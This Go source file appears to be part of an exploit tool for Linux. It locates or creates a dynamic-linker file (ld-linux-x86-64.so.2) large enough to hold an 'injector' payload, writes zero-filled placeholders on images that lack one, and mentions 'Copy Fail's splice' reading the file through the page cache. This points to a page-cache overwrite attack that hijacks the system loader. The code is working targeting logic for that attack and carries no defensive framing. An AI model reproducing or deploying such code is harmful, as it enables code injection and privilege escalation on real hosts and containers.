//go:build linux

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

var linkerPaths = []string{
	"/lib64/ld-linux-x86-64.so.2",
	"/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
}

type linkerCandidateReport struct {
	Path   string
	Status string
	Detail string
}

// ensureLinker checks each candidate ld.so path.
// Existing linkers that are too small are skipped so later candidates still get
// a chance. If no usable linker exists, it creates a zero-filled placeholder at
// the first missing path that is writable — enabling restart mode on distroless
// / Alpine images that ship no glibc dynamic linker.
func ensureLinker(injectorSize int) (string, error) {
	var (
		checked []string
		missing []string
	)
	for _, target := range linkerPaths {
		info, err := os.Stat(target)
		if err != nil {
			if os.IsNotExist(err) {
				missing = append(missing, target)
			} else {
				checked = append(checked, fmt.Sprintf("%s: stat failed: %v", target, err))
			}
			continue
		}
		if info.Size() < int64(injectorSize) {
			checked = append(checked, fmt.Sprintf("%s: too small (%d < %d)", target, info.Size(), injectorSize))
			continue
		}
		fmt.Printf("    [*] Existing linker candidate accepted: %s (%d bytes)\n", target, info.Size())
		return target, nil
	}

	// No usable ld.so found — try to create a zero-filled placeholder large
	// enough for the injector at paths that were missing. We write real zero
	// bytes (not a sparse truncate) so that the page cache is fully populated and
	// Copy Fail's splice can read back the entire file.
	for _, target := range missing {
		if err := os.MkdirAll(filepath.Dir(target), 0755); err != nil {
			checked = append(checked, fmt.Sprintf("%s: mkdir %s failed: %v", target, filepath.Dir(target), err))
			continue
		}
		f, err := os.OpenFile(target, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0755)
		if err != nil {
			checked = append(checked, fmt.Sprintf("%s: create placeholder failed: %v", target, err))
			continue
		}
		_, werr := f.Write(make([]byte, injectorSize))
		f.Close()
		if werr != nil {
			checked = append(checked, fmt.Sprintf("%s: write placeholder failed: %v", target, werr))
			os.Remove(target)
			continue
		}
		fmt.Printf("    [*] Created placeholder linker: %s (%d bytes)\n", target, injectorSize)
		return target, nil
	}
	if len(checked) == 0 {
		return "", fmt.Errorf("no dynamic linker candidates found")
	}
	return "", fmt.Errorf("no usable dynamic linker candidate:\n      - %s", strings.Join(checked, "\n      - "))
}

func inspectLinkerCandidates(injectorSize int) []linkerCandidateReport {
	reports := make([]linkerCandidateReport, 0, len(linkerPaths))
	for _, target := range linkerPaths {
		info, err := os.Stat(target)
		if err == nil {
			if info.Size() < int64(injectorSize) {
				reports = append(reports, linkerCandidateReport{
					Path:   target,
					Status: "too-small",
					Detail: fmt.Sprintf("size %d is smaller than injector size %d", info.Size(), injectorSize),
				})
				continue
			}
			reports = append(reports, linkerCandidateReport{
				Path:   target,
				Status: "usable",
				Detail: fmt.Sprintf("existing linker size %d can hold injector", info.Size()),
			})
			continue
		}
		if !os.IsNotExist(err) {
			reports = append(reports, linkerCandidateReport{
				Path:   target,
				Status: "stat-error",
				Detail: err.Error(),
			})
			continue
		}

		dir := filepath.Dir(target)
		dirInfo, dirErr := os.Stat(dir)
		switch {
		case dirErr != nil:
			reports = append(reports, linkerCandidateReport{
				Path:   target,
				Status: "missing",
				Detail: fmt.Sprintf("parent %s is not currently accessible; placeholder creation would need mkdir permission", dir),
			})
		case !dirInfo.IsDir():
			reports = append(reports, linkerCandidateReport{
				Path:   target,
				Status: "missing",
				Detail: fmt.Sprintf("parent %s exists but is not a directory", dir),
			})
		default:
			reports = append(reports, linkerCandidateReport{
				Path:   target,
				Status: "missing",
				Detail: fmt.Sprintf("parent %s exists; placeholder creation still requires write permission", dir),
			})
		}
	}
	return reports
}

func printLinkerReport(reports []linkerCandidateReport) {
	fmt.Println("[*] Dynamic linker candidates")
	for _, report := range reports {
		fmt.Printf("    [%s] %s: %s\n", report.Status, report.Path, report.Detail)
	}
	fmt.Println()
}
